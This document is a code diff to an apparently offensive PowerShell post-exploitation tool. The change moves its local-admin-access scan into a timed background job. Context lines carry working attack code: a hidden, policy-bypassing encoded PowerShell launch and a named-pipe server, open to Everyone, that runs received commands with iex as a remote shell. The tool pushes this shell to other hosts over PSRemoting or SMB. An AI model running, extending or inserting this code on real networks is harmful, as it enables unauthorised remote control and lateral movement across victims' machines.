@@ -1608,15 +1608,9 @@ exit
 					
 					$finalstring =  "powershell.exe -WindowS Hidden -ep Bypass -enc $b64ServerScript"
 					
-					if(!$global:AllUserDefinedTargets){
-						$LocalAdminAccessOutput = Find-LocalAdminAccess -Method PSRemoting -Command $finalstring -NoOutput
-					}
-					else{
-						$LocalAdminAccessTargets = $global:AllUserDefinedTargets -join ","
-						$LocalAdminAccessOutput = Find-LocalAdminAccess -Targets $LocalAdminAccessTargets -Method PSRemoting -Command $finalstring -NoOutput
-					}
+					$_laaMethod = 'PSRemoting'
 				}
-				
+
 				elseif($global:localadminaccesspayload -eq 'SMB'){					
 					if($global:Detach){$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$global:BufferSize,$global:BufferSize,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){Start-Sleep -Milliseconds 100;if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
 					else{$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$global:BufferSize,$global:BufferSize,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){Start-Sleep -Milliseconds 100;if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
@@ -1627,15 +1621,38 @@ exit
 					
 					$finalstring = $finalstring -replace '"', "'"
 					
-					if(!$global:AllUserDefinedTargets){
-						$LocalAdminAccessOutput = Find-LocalAdminAccess -Method SMB -Command $finalstring -NoOutput
-					}
-					else{
-						$LocalAdminAccessTargets = $global:AllUserDefinedTargets -join ","
-						$LocalAdminAccessOutput = Find-LocalAdminAccess -Targets $LocalAdminAccessTargets -Method SMB -Command $finalstring -NoOutput
-					}
+					$_laaMethod = 'SMB'
 				}
-				
+
+				if ($finalstring -and $_laaMethod) {
+					$_laaTargets = if ($global:AllUserDefinedTargets) { $global:AllUserDefinedTargets -join "," } else { $null }
+					$_laaFunc = ${function:Find-LocalAdminAccess}
+					Write-Output " [*] Scanning for local admin access (90s timeout, Ctrl+C to cancel)..."
+					$_laaJob = Start-Job -ScriptBlock {
+						param($fd, $method, $cmd, $targets)
+						New-Item -Path function:Find-LocalAdminAccess -Value ([scriptblock]::Create($fd)) | Out-Null
+						if ($targets) { Find-LocalAdminAccess -Targets $targets -Method $method -Command $cmd -NoOutput }
+						else { Find-LocalAdminAccess -Method $method -Command $cmd -NoOutput }
+					} -ArgumentList $_laaFunc, $_laaMethod, $finalstring, $_laaTargets
+					$_laaTimeout = 90; $_laaElapsed = 0; $_laaCancelled = $false
+					[console]::TreatControlCAsInput = $true
+					while ($_laaJob.State -eq 'Running' -and $_laaElapsed -lt $_laaTimeout) {
+						Start-Sleep -Seconds 1; $_laaElapsed++
+						if ([console]::KeyAvailable) {
+							$_key = [console]::ReadKey($true)
+							if ($_key.Key -eq 'C' -and ($_key.Modifiers -band [ConsoleModifiers]::Control)) { $_laaCancelled = $true; break }
+						}
+					}
+					[console]::TreatControlCAsInput = $false
+					if ($_laaCancelled -or $_laaJob.State -eq 'Running') {
+						Stop-Job $_laaJob | Out-Null; Remove-Job $_laaJob | Out-Null
+						$global:MultiPipeName = $global:OldPipeNameToRestore; $global:ScanModer = $False
+						$global:Message = if ($_laaCancelled) { " [!] Scan cancelled" } else { " [!] Scan timed out after ${_laaTimeout}s — use local shell: Find-LocalAdminAccess -Targets <hosts>" }
+						continue
+					}
+					$LocalAdminAccessOutput = Receive-Job $_laaJob; Remove-Job $_laaJob | Out-Null
+				}
+
 				$LocalAdminAccessOutput = $LocalAdminAccessOutput.Trim()
 				$LocalAdminAccessOutput = ($LocalAdminAccessOutput | Out-String) -split "`n"
 				$LocalAdminAccessOutput = $LocalAdminAccessOutput.Trim()
